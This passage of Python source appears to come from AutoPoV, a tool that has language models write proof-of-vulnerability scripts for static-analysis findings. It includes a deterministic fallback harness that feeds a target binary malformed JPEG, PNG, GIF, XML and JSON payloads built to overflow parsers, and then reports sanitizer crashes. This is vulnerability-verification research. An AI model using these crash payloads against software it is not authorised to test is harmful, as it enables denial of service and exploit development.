                    if str(_native_plan.get('input_format') or '').lower() in {'c', 'cpp', 'function'}:
                        _native_plan['input_format'] = 'text'
                    merged['execution_surface'] = 'binary_cli'
                elif self._native_entrypoint_requires_function_harness(
                    merged.get('target_entrypoint') or '',
                    _known_subcommands,
                ):
                    # Entrypoint looks like an internal C symbol (no CLI subcommand match).
                    # BUT: if a CLI binary exists (subcommands found), do NOT flip to
                    # function_call.  Inline C harnesses are fragile for external binaries.
                    # Instead keep binary_cli and surface ALL known subcommands as candidates
                    # so the model picks the most relevant one itself.
                    # Only flip to function_harness if there is NO binary at all.
                    _has_built_binary = bool(
                        str(merged.get('target_binary') or '').strip()
                        or str(merged.get('probe_binary_path') or '').strip()
                        or (
                            merged.get('runtime_feedback') and
                            str(self._flatten_runtime_feedback(
                                merged['runtime_feedback']
                                if isinstance(merged.get('runtime_feedback'), dict) else {}
                            ).get('target_binary') or '').strip()
                        )
                    )
                    if _has_built_binary:
                        # CLI binary confirmed: stay on binary_cli, expose all subcommands
                        _native_plan['execution_surface'] = 'binary_cli'
                        _native_plan['observed_subcommands'] = _known_subcommands
                        if str(_native_plan.get('input_mode') or '').lower() == 'function':
                            _native_plan['input_mode'] = 'argv'
                        if str(_native_plan.get('input_format') or '').lower() in {'c', 'cpp', 'function'}:
                            _native_plan['input_format'] = 'text'
                        merged['execution_surface'] = 'binary_cli'
                    else:
                        # No binary evidence at all — fall back to function-level harness
                        _native_plan['execution_surface'] = 'function_call'
                        _native_plan['input_mode'] = 'function'
                        _native_plan['input_format'] = (
                            merged.get('runtime_profile')
                            if str(merged.get('runtime_profile') or '').lower() in {'c', 'cpp'}
                            else 'c'
                        )
                        _native_plan['target_entrypoint'] = merged.get('target_entrypoint') or _native_plan.get('target_entrypoint') or ''
                        for stale_key in ('subcommand', 'route_shape', 'trigger_shape', 'payload_mode'):
                            _native_plan.pop(stale_key, None)
                        merged['execution_surface'] = 'function_harness'
            merged['proof_plan'] = self._normalize_proof_plan(
                _native_plan,
                cwe_type,
                filepath,
                merged.get('target_entrypoint', ''),
                merged.get('runtime_profile', ''),
                merged.get('inputs', []) or [],
            )

        return merged

    def _extract_subcommands_from_surface(self, runtime_feedback) -> List[str]:
        """Extract CLI subcommands from preflight-observed surface data.

        Priority:
          1. observed_surface.commands / .subcommands (structured list -- best case)
          2. Parse observed_surface.help_text for a 'Commands:' section
             Handles: same-line comma/space separated, multi-line block.
        """
        rf = runtime_feedback or {}
        # The pov_tester stores surface data under key 'surface'; the contract
        # normaliser stores it under 'observed_surface' after flattening.
        # Accept both so subcommand extraction works in all code paths.
        obs = rf.get('observed_surface') or rf.get('surface') or {}
        # 1. Direct structured list
        cmds = obs.get('commands') or obs.get('subcommands')
        if cmds and isinstance(cmds, list):
            return [str(c).strip() for c in cmds if str(c).strip()]
        # 2. Parse help_text
        help_text = str(obs.get('help_text') or '')
        if 'commands' not in help_text.lower():
            return []
        found: List[str] = []
        collecting = False  # guard: only collect lines AFTER a Commands: header
        for line in help_text.splitlines():
            m = re.search(r'commands?\s*(?:\([^)]*\))?\s*:(.*)', line, re.IGNORECASE)
            if m:
                # Same-line: "Commands: keygen, archive, extract, fingerprint"
                # Split on whitespace AND commas to handle any spacing.
                raw_tokens = re.split(r'[\s,]+', m.group(1))
                inline = [t.strip().strip(',').strip() for t in raw_tokens if t.strip()]
                inline = [t for t in inline if t and not t.startswith('-')]
                if inline:
                    return inline  # same-line wins; no need to scan block
                # Header with no inline tokens -- switch to multi-line collection
                collecting = True
                continue
            if collecting:
                stripped = line.strip()
                if not stripped or stripped.startswith('[') or stripped.startswith('('):
                    break  # end of command block
                if stripped.startswith('-'):
                    continue  # skip option lines that bleed into the block
                tok = stripped.split()[0].strip(',').strip()
                if tok and not tok.startswith('-') and not tok.endswith(':'):
                    found.append(tok)
        return found

    def _should_use_native_library_fallback(self, exploit_contract: Optional[Dict[str, Any]], filepath: str, vulnerable_code: str) -> bool:
        contract = exploit_contract or {}
        runtime_profile = str(contract.get('runtime_profile') or self._infer_runtime_profile_from_filepath(filepath) or '').lower()
        if runtime_profile not in {'c', 'cpp', 'native', 'binary'}:
            return False
        if Path(filepath or '').suffix.lower() not in {'.c', '.cc', '.cpp', '.cxx', '.h', '.hpp'}:
            return False
        if not str(vulnerable_code or '').strip():
            return False
        target_entrypoint = str(contract.get('target_entrypoint') or '').strip().lower()
        return target_entrypoint not in {'', 'unknown', 'none', 'n/a'}

    def _synthesize_native_library_fallback_pov(
        self,
        cwe_type: str,
        filepath: str,
        vulnerable_code: str,
        explanation: str,
        exploit_contract: Optional[Dict[str, Any]],
        runtime_feedback: Optional[Dict[str, Any]] = None,
    ) -> Optional[Dict[str, Any]]:
        contract_seed = dict(exploit_contract or {})
        if runtime_feedback:
            contract_seed['runtime_feedback'] = runtime_feedback
        contract = self._normalize_exploit_contract(contract_seed, cwe_type, explanation, vulnerable_code, filepath=filepath)
        if not self._should_use_native_library_fallback(contract, filepath, vulnerable_code):
            return None

        target_entrypoint = str(contract.get('target_entrypoint') or '').strip()
        target_binary = str(contract.get('target_binary') or '').strip()
        runtime_profile = str(contract.get('runtime_profile') or self._infer_runtime_profile_from_filepath(filepath) or 'c').lower()
        plan = dict(contract.get('proof_plan') or {})
        plan['runtime_family'] = 'native'
        plan['execution_surface'] = 'function_call'
        plan['input_mode'] = 'function'
        plan['input_format'] = runtime_profile if runtime_profile in {'c', 'cpp'} else 'c'
        plan['oracle'] = list(dict.fromkeys([*(plan.get('oracle') or []), 'crash_signal', 'sanitizer_output', 'stdout_marker']))
        plan['preflight_checks'] = list(dict.fromkeys([*(plan.get('preflight_checks') or []), 'target_entrypoint_resolves']))
        plan['fallback_strategies'] = list(dict.fromkeys([*(plan.get('fallback_strategies') or []), 'targeted_native_sanitizer_harness']))
        contract['proof_plan'] = plan
        if not contract.get('inputs'):
            contract['inputs'] = ['deterministic function-level harness invocation']
        if not contract.get('trigger_steps'):
            contract['trigger_steps'] = [f'Compile a harness that invokes {target_entrypoint}', 'Observe crash or sanitizer evidence']
        contract['expected_outcome'] = contract.get('expected_outcome') or 'The synthesized harness should crash or emit sanitizer evidence if the vulnerability is real'

        # Resolve a known subcommand so the harness doesn't call the binary bare
        # and get "missing command" instead of exercising the vulnerable path.
        # Priority: proof_plan.subcommand > contract.known_subcommands > runtime_feedback observed_surface
        resolved_subcommand = str(plan.get('subcommand') or '').strip().lower()
        known_subcommands = [
            str(s).strip().lower()
            for s in self._coerce_listish(contract.get('known_subcommands'))
            if str(s).strip()
        ]
        if not known_subcommands and runtime_feedback:
            known_subcommands = self._extract_subcommands_from_surface(runtime_feedback)

        # Use the binary name for TARGET_SYMBOL (glob search), not the entrypoint function.
        # Priority: probe_binary_name (actual discovered binary) > target_binary from contract
        # > stem of filepath (last resort, may be a source file name — least preferred).
        probe_binary_name = str(contract.get('probe_binary_name') or '').strip()
        binary_name = probe_binary_name or target_binary or Path(filepath).stem or target_entrypoint

        # Detect keygen bootstrap requirement from setup_requirements or known_subcommands.
        _BOOTSTRAP_SUBCOMMAND_HINTS = {'keygen', 'init', 'setup', 'configure', 'genkey', 'gen-key', 'generate-key', 'generate_key'}
        setup_reqs = [str(r).lower() for r in self._coerce_listish(contract.get('setup_requirements'))]
        needs_bootstrap = (
            any('key material' in r or 'bootstrap key material' in r for r in setup_reqs)
            or bool(_BOOTSTRAP_SUBCOMMAND_HINTS & {str(s).lower() for s in known_subcommands})
        )
        boot_sub = next(
            (str(s) for s in known_subcommands if str(s).lower() in _BOOTSTRAP_SUBCOMMAND_HINTS),
            'keygen'
        ) if needs_bootstrap else ''

        # When picking the trigger subcommand, never use a bootstrap subcommand as the trigger.
        # proof_plan.subcommand already has priority; fall back to non-bootstrap known_subcommands.
        # Also try to match non-bootstrap subs to target_entrypoint (e.g. 'enchive_decrypt' -> 'extract').
        non_bootstrap_subs = [
            s for s in known_subcommands if s not in _BOOTSTRAP_SUBCOMMAND_HINTS
        ]
        if not resolved_subcommand or resolved_subcommand in _BOOTSTRAP_SUBCOMMAND_HINTS:
            # Try to find a subcommand whose name appears in the target_entrypoint string
            # e.g. target_entrypoint='enchive_decrypt' matches 'extract' (no), 'archive' (no)
            # More useful: target_entrypoint='command_extract' -> 'extract'
            entrypoint_lower = target_entrypoint.lower()
            matched_sub = next(
                (s for s in non_bootstrap_subs if s in entrypoint_lower or entrypoint_lower.endswith(s)),
                None
            )
            if matched_sub:
                resolved_subcommand = matched_sub
            elif non_bootstrap_subs:
                resolved_subcommand = non_bootstrap_subs[0]
            elif known_subcommands:
                resolved_subcommand = known_subcommands[0]

        if resolved_subcommand:
            argv_expr = f'[binary, {resolved_subcommand!r}, "A" * 256]'
            argv_comment = f'# Known subcommand: {resolved_subcommand!r} — replace payload to trigger the vulnerability'
        else:
            argv_expr = None
            argv_comment = '# File-argument tool: craft a malicious input file and pass it as positional arg'

        # Detect whether this is a file-argument tool (no subcommands, takes positional files).
        # Check probe surface for supports_positional_file or infer from help text.
        observed_surface = runtime_feedback.get('observed_surface', {}) if runtime_feedback else {}
        supports_file = (
            observed_surface.get('supports_positional_file')
            or (not known_subcommands and 'file' in (contract.get('probe_baseline_stderr') or '').lower())
            or (not known_subcommands and 'file' in (contract.get('help_text') or '').lower())
            or (not known_subcommands)  # fallback: no subcommands → assume file-argument tool
        )

        # Infer file extension from binary name or cwe type.
        _EXT_MAP = {
            'jhead': '.jpg', 'exiftool': '.jpg', 'tiff': '.tif', 'convert': '.jpg',
            'mp3': '.mp3', 'ffmpeg': '.mp4', 'pdf': '.pdf', 'gif': '.gif',
            'png': '.png', 'bmp': '.bmp', 'webp': '.webp',
            # XML parsers
            'xmlwf': '.xml', 'xmllint': '.xml', 'xmlto': '.xml', 'xml2': '.xml',
            'expat': '.xml', 'libxml': '.xml',
            # JSON parsers
            'cjson': '.json', 'json': '.json', 'jansson': '.json', 'jq': '.json',
        }
        inferred_ext = next(
            (ext for key, ext in _EXT_MAP.items() if key in binary_name.lower()),
            '.bin'
        )

        # Pre-compute the argv line / file-payload block.
        # When supports_file=True the entire main() body is replaced by the fuzz loop;
        # the argv_line + result tail is NOT emitted (it would be dead code after return 1).
        if argv_expr is not None:
            argv_line = f'argv = {argv_expr}'
            file_payload_block = ''
        elif supports_file:
            argv_line = ''  # unused — file_payload_block owns the return path
            file_payload_block = f"""
    # Format-aware file-argument fuzzer.
    # Payloads are structurally valid enough to pass the binary's magic/header check
    # but carry oversized fields that overflow the vulnerable parser.
    import tempfile
    _SOS = b'\\xff\\xda\\x00\\x0c\\x03\\x01\\x00\\x02\\x11\\x03\\x11\\x00\\x3f\\x00'
    _JPEG = [
        # SOI + small JFIF APP0 (16 bytes) + overlong APP1 Exif (entry count=65535) + SOS
        b'\\xff\\xd8'
        + b'\\xff\\xe0\\x00\\x10'
        + b'JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00'
        + b'\\xff\\xe1' + b'\\xff\\xfe'
        + b'Exif\\x00\\x00'
        + b'II\\x2a\\x00'
        + b'\\x08\\x00\\x00\\x00'
        + b'\\xff\\xff'
        + b'B' * (65532 - 6 - 4 - 4 - 2)
        + _SOS,
        # SOI + APP1 Exif only + SOS
        b'\\xff\\xd8'
        + b'\\xff\\xe1' + b'\\xff\\xfe'
        + b'Exif\\x00\\x00'
        + b'II\\x2a\\x00'
        + b'\\x08\\x00\\x00\\x00'
        + b'\\xff\\xff'
        + b'B' * (65532 - 6 - 4 - 4 - 2)
        + _SOS,
        # SOI + COM comment + SOS
        b'\\xff\\xd8'
        + b'\\xff\\xfe' + b'\\xff\\xfe'
        + b'C' * 65532
        + _SOS,
    ]
    _PNG = [
        # Valid PNG sig + IHDR with width/height=0xffffffff (integer overflow in dim reader)
        b'\\x89PNG\\r\\n\\x1a\\n' + b'\\x00\\x00\\x00\\rIHDR'
        + b'\\xff\\xff\\xff\\xff' + b'\\xff\\xff\\xff\\xff'
        + b'\\x08\\x02\\x00\\x00\\x00' + b'A' * 4096,
    ]
    _GIF = [
        b'GIF89a' + b'\\xff\\xff' + b'\\xff\\xff' + b'\\xf7\\x00\\x00' + b'A' * 65530,
    ]
    _XML = [
        b'<?xml version="1.0"?>\\n<root>' + b'<a>' * 10000 + b'X' * 65536 + b'</a>' * 10000 + b'</root>',
        b'<?xml version="1.0"?><root attr="' + b'A' * 65536 + b'"/>',
        b'<?xml version="1.0"?><root>\\xff\\xfe' + b'B' * 65536 + b'</root>',
        b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "' + b'A' * 8192 + b'">]><x>&a;&a;&a;&a;&a;&a;&a;&a;</x>',
    ]
    _JSON = [
        b'[' * 100000 + b'1' + b']' * 100000,
        b'{{"key": "' + b'A' * 65536 + b'"}}',
        b'{{"n": ' + b'9' * 65536 + b'}}',
        b'{{"k": "' + b'\\xff\\xfe' * 32768 + b'"}}',
    ]
    _GENERIC = [
        # JPEG: SOI + small JFIF APP0 (16 bytes) + Exif APP1 overflow + SOS
        b'\\xff\\xd8'
        + b'\\xff\\xe0\\x00\\x10'
        + b'JFIF\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x01\\x00\\x00'
        + b'\\xff\\xe1' + b'\\xff\\xfe'
        + b'Exif\\x00\\x00' + b'II\\x2a\\x00' + b'\\x08\\x00\\x00\\x00' + b'\\xff\\xff'
        + b'B' * (65532 - 6 - 4 - 4 - 2)
        + _SOS,
        b'\\x89PNG\\r\\n\\x1a\\n' + b'\\x00\\x00\\x00\\rIHDR' + b'\\xff' * 4096,
        b'GIF89a' + b'\\xff\\xff' + b'\\xff\\xff' + b'A' * 65530,
        b'%PDF-1.4\\n' + b'A' * 65536,
        b'A' * 65536,
    ]
    _PAYLOADS = {{
        '.jpg': _JPEG + _GENERIC,
        '.jpeg': _JPEG + _GENERIC,
        '.png': _PNG + _GENERIC,
        '.gif': _GIF + _GENERIC,
        '.tif': [b'II*\\x00' + b'\\xff' * 65536, b'MM\\x00*' + b'\\xff' * 65536] + _GENERIC,
        '.tiff': [b'II*\\x00' + b'\\xff' * 65536, b'MM\\x00*' + b'\\xff' * 65536] + _GENERIC,
        '.webp': [b'RIFF' + b'\\xff\\xff\\xff\\xff' + b'WEBP' + b'A' * 65530] + _GENERIC,
        '.bmp': [b'BM' + b'\\xff\\xff\\xff\\xff' + b'\\x00' * 4 + b'\\x36\\x00\\x00\\x00' + b'A' * 65530] + _GENERIC,
        '.xml': _XML + _GENERIC,
        '.json': _JSON + _GENERIC,
    }}.get({inferred_ext!r}, _GENERIC)
    for _payload in _PAYLOADS:
        with tempfile.NamedTemporaryFile(suffix={inferred_ext!r}, delete=False) as _tf:
            _tf.write(_payload)
            _payload_path = _tf.name
        try:
            _res = subprocess.run([binary, _payload_path], capture_output=True, text=True, timeout=15)
            _rc = emit_if_triggered(_res.stdout, _res.stderr, _res.returncode)
            if _rc == 0:
                return 0
        except subprocess.TimeoutExpired:
            pass
        finally:
            try:
                os.unlink(_payload_path)
            except OSError:
                pass
    return 1"""
        else:
            argv_line = 'argv = [binary]  # fallback — no subcommand or file surface detected'
            file_payload_block = ''

        # Build optional bootstrap block
        if needs_bootstrap and boot_sub:
            bootstrap_block = f"""
    # Bootstrap: run keygen non-interactively to create key material
    home_dir = os.environ.get('AUTOPOV_BOOTSTRAP_HOME') or HOME or '/tmp/autopov_home'
    os.makedirs(home_dir, exist_ok=True)
    boot_env = dict(os.environ)
    boot_env['HOME'] = home_dir
    boot_result = subprocess.run([binary, {boot_sub!r}], input='autopov\\nautopov\\n', capture_output=True, text=True, env=boot_env)
    # If keygen itself crashes with a sanitizer error, that IS the vulnerability — report it.
    boot_triggered = emit_if_triggered(boot_result.stdout, boot_result.stderr, boot_result.returncode)
    if boot_triggered == 0:
        return 0  # Crash confirmed during bootstrap stage
    if boot_result.returncode not in (0, 1):  # keygen may exit 1 if key already exists
        sys.stderr.write('[AutoPoV] keygen setup failed: ' + boot_result.stderr + '\\n')
        return 1
    run_env = boot_env"""
            run_call = 'subprocess.run(argv, capture_output=True, text=True, env=run_env)'
        else:
            bootstrap_block = ''
            run_call = 'subprocess.run(argv, capture_output=True, text=True)'

        file_mode_flag = 'True' if file_payload_block else 'False'

        # subcommand_tail: the argv + run + emit block, only emitted when NOT in file-payload mode.
        # When file_payload_block is non-empty it already owns the return path (return 0/1 inside
        # the fuzz loop), so this tail would be dead code and must be omitted.
        if file_payload_block:
            subcommand_tail = ''
        else:
            subcommand_tail = f"""
    {argv_comment}
    {argv_line}
    if len(argv) <= 1:
        sys.stderr.write('[AutoPoV] argv not set\\n')
        return 1
    result = {run_call}
    return emit_if_triggered(result.stdout, result.stderr, result.returncode)"""

        pov_script = f"""import os
import subprocess
import sys
import glob

TARGET_SYMBOL = {binary_name!r}
TARGET_BINARY = os.environ.get('TARGET_BINARY') or os.environ.get('TARGET_BIN') or {target_binary!r}
CODEBASE_PATH = os.environ.get('CODEBASE_PATH') or ''
HOME = os.environ.get('HOME') or ''
CRASH_MARKERS = ('AddressSanitizer', 'UndefinedBehaviorSanitizer', 'Segmentation fault', 'SIGSEGV', 'heap-buffer-overflow', 'stack-buffer-overflow', 'heap-use-after-free', 'double-free', 'runtime error:')
# Markers that only appear in RUNTIME crash output (not in compiler flags or build output)
RUNTIME_CRASH_MARKERS = ('heap-buffer-overflow', 'stack-buffer-overflow', 'heap-use-after-free', 'double-free', 'runtime error:', 'Segmentation fault', 'SIGSEGV', '==ERROR: AddressSanitizer', '==ERROR: UndefinedBehavior', 'SUMMARY: AddressSanitizer')


def emit_if_triggered(stdout: str, stderr: str, exit_code: int) -> int:
    combined = (stdout or '') + '\\n' + (stderr or '')
    # Use RUNTIME_CRASH_MARKERS (not CRASH_MARKERS) to avoid matching compiler flags
    # like -fsanitize=address in build output.
    crash_detected = (
        any(m in combined for m in RUNTIME_CRASH_MARKERS)
        or exit_code in (134, 139, -11, -6)
    )
    if crash_detected:
        # Pass through the subprocess output so the oracle sees the real crash evidence,
        # then print VULNERABILITY TRIGGERED as a confirmation marker.
        sys.stdout.write(stdout or '')
        sys.stderr.write(stderr or '')
        print('VULNERABILITY TRIGGERED')
        return 0
    sys.stdout.write(stdout or '')
    sys.stderr.write(stderr or '')
    return exit_code


def main() -> int:
    binary = TARGET_BINARY
    if not binary and CODEBASE_PATH:
        hits = [p for p in glob.glob(os.path.join(CODEBASE_PATH, '**', TARGET_SYMBOL), recursive=True) if os.path.isfile(p) and os.access(p, os.X_OK)]
        binary = hits[0] if hits else ''
    if not binary or not os.path.isfile(binary):
        sys.stderr.write('[AutoPoV] binary not found: ' + TARGET_SYMBOL + '\\n')
        return 1{bootstrap_block}{file_payload_block}{subcommand_tail}


if __name__ == '__main__':
    raise SystemExit(main())
"""
        contract['contract_audit'] = self.audit_handoff(contract, cwe_type, explanation, vulnerable_code, filepath=filepath, runtime_feedback=contract.get('runtime_feedback') or {}, phase='generation')
        return {
            'success': True,
            'pov_script': pov_script,
            'pov_language': 'python',
            'target_language': runtime_profile,
            'exploit_contract': contract,
            'generation_time_s': 0.0,
            'timestamp': datetime.utcnow().isoformat(),
            'model_used': 'deterministic_native_harness_fallback',
            'cost_usd': 0.0,
            'token_usage': {},
            'openrouter_usage': None,
        }

    @staticmethod
    def _strip_think_blocks(text: str) -> str:
        """Remove <think>...</think> reasoning blocks emitted by qwen3 and similar models."""
        import re as _re
        return _re.sub(r'<think>[\s\S]*?</think>', '', text or '').strip()

    @staticmethod
    def _strip_language_prefix(script: str) -> str:
        """Strip bare language tag prefix (e.g. 'python\n' or 'javascript\n') that some
        models emit without a surrounding code fence. These appear as the first token on
        line 1 and cause a NameError/SyntaxError when the script is executed."""
        if not script:
            return script
        _LANG_TAGS = {
            'python', 'python3', 'javascript', 'js', 'ruby', 'php', 'go', 'bash', 'sh',
        }
        first_newline = script.find('\n')
        if first_newline > 0:
            first_line = script[:first_newline].strip().lower()
            if first_line in _LANG_TAGS:
                return script[first_newline + 1:]
        return script

    def _parse_pov_payload(self, raw_content: str, cwe_type: str, explanation: str, vulnerable_code: str, filepath: str = '') -> Dict[str, Any]:
        payload = self._strip_think_blocks(raw_content or "").strip()
        if payload.startswith("```json"):
            payload = payload.split("```json", 1)[1].split("```", 1)[0].strip()
        elif payload.startswith("```"):
            payload = payload.split("```", 1)[1].rsplit("```", 1)[0].strip()
        # Strip bare 'proof-plan' header that some models (e.g. glm) emit without
        # code fences: they write the literal text 'proof-plan' followed by a JSON
        # block instead of wrapping it in ```json ... ```.  Drop everything up to
        # (but not including) the first '{' so the JSON parser can proceed normally.
        # Also handles 'proof_plan', 'PROOF-PLAN', etc.
        _stripped_lower = payload.lstrip()
        if not _stripped_lower.startswith('{') and not _stripped_lower.startswith('[') and not _stripped_lower.startswith('"'):
            _bare_header = re.match(
                r'^[^{\["]*?\n\s*(?=[{\["\`])',
                payload,
                re.DOTALL | re.IGNORECASE,
            )
            if _bare_header and re.search(r'proof.?plan', payload[:_bare_header.end()], re.IGNORECASE):
                payload = payload[_bare_header.end():].strip()
        try:
            cleaned = payload
            data = json.loads(cleaned.strip())
            pov_script = (data.get("pov_script") or "").strip()
            contract_seed = data.get("exploit_contract") or {}
            if isinstance(data, dict) and data.get("proof_plan") and isinstance(contract_seed, dict) and not contract_seed.get('proof_plan'):
                contract_seed = dict(contract_seed)
                contract_seed['proof_plan'] = data.get('proof_plan')
            contract = self._normalize_exploit_contract(contract_seed, cwe_type, explanation, vulnerable_code, filepath=filepath)
            if pov_script:
                return {"pov_script": pov_script, "exploit_contract": contract}
            if isinstance(data, dict) and any(k in data for k in ["failure_reason", "suggested_changes", "different_approach"]):
                return {"pov_script": "", "exploit_contract": contract}
        except Exception:
            extracted_pov = ""
            pov_match = re.search(r'"pov_script"\s*:\s*"((?:\\.|[^"\\])*)"', payload, re.DOTALL)
            if pov_match:
                try:
                    extracted_pov = json.loads(f'"{pov_match.group(1)}"').strip()
                except Exception:
                    extracted_pov = pov_match.group(1).encode("utf-8", errors="ignore").decode("unicode_escape").strip()
            if extracted_pov:
                return {
                    "pov_script": extracted_pov,
                    "exploit_contract": self._normalize_exploit_contract({}, cwe_type, explanation, vulnerable_code, filepath=filepath),
                }

        pov_script = payload
        if "```python" in pov_script:
            pov_script = pov_script.split("```python", 1)[1].split("```", 1)[0].strip()
        elif "```javascript" in pov_script:
            pov_script = pov_script.split("```javascript", 1)[1].split("```", 1)[0].strip()
        elif "```" in pov_script:
            pov_script = pov_script.split("```", 1)[1].split("```", 1)[0].strip()
        pov_script = self._strip_language_prefix(pov_script)
        stripped = pov_script.lstrip()
        if stripped.startswith("{") or stripped.startswith("["):
            return {"pov_script": "", "exploit_contract": self._normalize_exploit_contract({}, cwe_type, explanation, vulnerable_code, filepath=filepath)}
        return {"pov_script": pov_script, "exploit_contract": self._normalize_exploit_contract({}, cwe_type, explanation, vulnerable_code, filepath=filepath)}

    
    def _is_offline_model_selected(self, model_name: Optional[str] = None) -> bool:
        selected_model = (model_name or settings.MODEL_NAME or '').strip()
        return settings.is_offline_model(selected_model)

    def _compact_text(self, value: str, max_chars: int) -> str:
        text = (value or '').strip()
        if max_chars <= 0 or len(text) <= max_chars:
            return text
        if max_chars <= 160:
            return text[:max_chars].rstrip()
        head = max_chars // 2
        tail = max_chars - head - len('\n...\n')
        return f"{text[:head].rstrip()}\n...\n{text[-max(0, tail):].lstrip()}"

    def _trim_validation_errors(self, validation_errors: List[str], max_items: int, max_chars: int) -> List[str]:
        trimmed = []
        for item in (validation_errors or [])[:max_items]:
            trimmed.append(self._compact_text(str(item), max_chars))
        return trimmed

    def _compact_offline_contract(self, exploit_contract: Optional[Dict[str, Any]], model_name: Optional[str], purpose: str) -> Dict[str, Any]:
        contract = exploit_contract or {}
        if not isinstance(contract, dict):
            return {}
        budget = settings.get_offline_pov_budget(model_name=model_name, purpose=purpose)
        max_text = max(180, min(700, budget.get("max_explanation_chars", 500)))

        def shrink(value: Any, limit: int = max_text) -> str:
            return self._compact_text(str(value or ""), limit)

        compact = {
            "goal": shrink(contract.get("goal"), max_text),
            "target_entrypoint": shrink(contract.get("target_entrypoint"), 160),
            "runtime_profile": shrink(contract.get("runtime_profile"), 80),
            "expected_outcome": shrink(contract.get("expected_outcome"), max_text),
            "preconditions": [shrink(x, 120) for x in (contract.get("preconditions") or [])[:4] if str(x).strip()],
            "inputs": [shrink(x, 140) for x in (contract.get("inputs") or [])[:4] if str(x).strip()],
            "trigger_steps": [shrink(x, 160) for x in (contract.get("trigger_steps") or [])[:5] if str(x).strip()],
            "success_indicators": [shrink(x, 100) for x in (contract.get("success_indicators") or [])[:5] if str(x).strip()],
            "side_effects": [shrink(x, 100) for x in (contract.get("side_effects") or [])[:4] if str(x).strip()],
        }
        plan = contract.get("proof_plan") or {}
        if isinstance(plan, dict):
            compact["proof_plan"] = {
                "runtime_family": shrink(plan.get("runtime_family"), 40),
                "execution_surface": shrink(plan.get("execution_surface"), 40),
                "input_mode": shrink(plan.get("input_mode"), 40),
                "input_format": shrink(plan.get("input_format"), 40),
                "oracle": [shrink(x, 80) for x in (plan.get("oracle") or [])[:4] if str(x).strip()],
                "preflight_checks": [shrink(x, 100) for x in (plan.get("preflight_checks") or [])[:4] if str(x).strip()],
                "binary_candidates": [shrink(x, 80) for x in (plan.get("binary_candidates") or [])[:4] if str(x).strip()],
                "fallback_strategies": [shrink(x, 100) for x in (plan.get("fallback_strategies") or [])[:4] if str(x).strip()],
            }
        return {k: v for k, v in compact.items() if v not in (None, "", [], {})}

    def _prepare_offline_pov_inputs(
        self,
        model_name: Optional[str],
        purpose: str,
        vulnerable_code: str,
        explanation: str,
        code_context: str,
        failed_pov: str = '',
        validation_errors: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        budget = settings.get_offline_pov_budget(model_name=model_name, purpose=purpose)
        return {
            'vulnerable_code': self._compact_text(vulnerable_code, budget['max_vulnerable_code_chars']),
            'explanation': self._compact_text(explanation, budget['max_explanation_chars']),
            'code_context': self._compact_text(code_context, budget['max_context_chars']),
            'failed_pov': self._compact_text(failed_pov, budget['max_failed_pov_chars']),
            'validation_errors': self._trim_validation_errors(
                validation_errors or [],
                budget['max_error_items'],
                budget['max_validation_error_chars'],
            ),
        }

    def _prepare_prompt_supporting_context(
        self,
        model_name: Optional[str],
        purpose: str,
        exploit_contract: Optional[Dict[str, Any]],
        validation_errors: Optional[List[str]] = None,
        runtime_feedback: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        contract = exploit_contract or {}
        rendered_feedback = self._render_runtime_feedback(validation_errors, runtime_feedback)
        if self._is_offline_model_selected(model_name):
            budget = settings.get_offline_pov_budget(model_name=model_name, purpose=purpose)
            return {
                'exploit_contract': self._compact_offline_contract(contract, model_name, purpose),
                'runtime_feedback': self._compact_text(rendered_feedback, budget['max_context_chars']),
            }
        return {
            'exploit_contract': contract,
            'runtime_feedback': rendered_feedback,
        }

    def _get_llm(self, model_name: Optional[str] = None, purpose: str = "general"):
        """Get LLM instance based on configuration"""
        llm_config = settings.get_llm_config(model_name=model_name)
        actual_model = model_name or llm_config["model"]
        
        if llm_config["mode"] == "online":
            if not OPENAI_AVAILABLE:
                raise VerificationError("OpenAI not available. Install langchain-openai")
            
            api_key = llm_config.get("api_key")
            if not api_key:
                raise VerificationError("OpenRouter API key not configured")
            
            llm = OpenRouterReasoningChat(
                model=actual_model,
                api_key=api_key,
                base_url=llm_config["base_url"],
                temperature=0.2,
                timeout=settings.LLM_REQUEST_TIMEOUT_S,
                reasoning_enabled=llm_config.get("reasoning_enabled", True),
                max_tokens=settings.get_online_max_tokens(),  # None = no cap
                default_headers={
                    "HTTP-Referer": "https://autopov.local",
                    "X-OpenRouter-Title": "AutoPoV"
                }
            )
            llm._autopov_model_name = actual_model
            
            if model_name is None:
                self._llm = llm
            return llm
        else:
            if not OLLAMA_AVAILABLE:
                raise VerificationError("Ollama not available. Install langchain-ollama")
            
            offline_options = settings.get_ollama_generation_options(actual_model, purpose=purpose)
            # For pov/refinement, the scaffold prompt asks for a mixed ```json block + Python
            # code block. Setting format="json" forces Ollama to constrain the entire response
            # to valid JSON, which prevents the Python script from being emitted correctly.
            # Only enable json format for pure-JSON purposes (validation, triage, scout, etc.).
            _json_format_purposes = {"validation", "triage", "scout", "retry", "general", "investigation"}
            ollama_format = "json" if purpose in _json_format_purposes else ""
            llm = ChatOllama(
                model=actual_model,
                base_url=llm_config["base_url"],
                temperature=0.2,
                format=ollama_format,
                reasoning=False,
                num_ctx=offline_options["num_ctx"],
                num_predict=offline_options["num_predict"],
                client_kwargs=settings.get_ollama_client_kwargs(actual_model, purpose=purpose)
            )
            llm._autopov_model_name = actual_model
            
            if model_name is None:
                self._llm = llm
            return llm
    
    def generate_pov(
        self,
        cwe_type: str,
        filepath: str,
        line_number: int,
        vulnerable_code: str,
        explanation: str,
        code_context: str,
        target_language: str = "python",
        model_name: Optional[str] = None,
        exploit_contract: Optional[Dict[str, Any]] = None,
        runtime_feedback: Optional[Dict[str, Any]] = None,
        codebase_path: str = '',
        source: str = '',
        probe_context: str = '',
        repo_input_hints: Optional[Dict[str, Any]] = None,
        joern_context: str = '',
    ) -> Dict[str, Any]:
        """
        Generate a PoV script for a vulnerability
        
        Args:
            cwe_type: CWE type
            filepath: File path
            line_number: Line number
            vulnerable_code: Vulnerable code snippet
            explanation: Vulnerability explanation
            code_context: Surrounding code context
            target_language: Language of the target codebase
            model_name: Optional model name to use
            codebase_path: Absolute root of the checked-out codebase (used for
                deterministic entrypoint extraction on CodeQL findings)
            source: Finding source ('codeql', 'semgrep', 'llm', …)
        
        Returns:
            Dictionary with PoV script and metadata
        """
        start_time = datetime.utcnow()

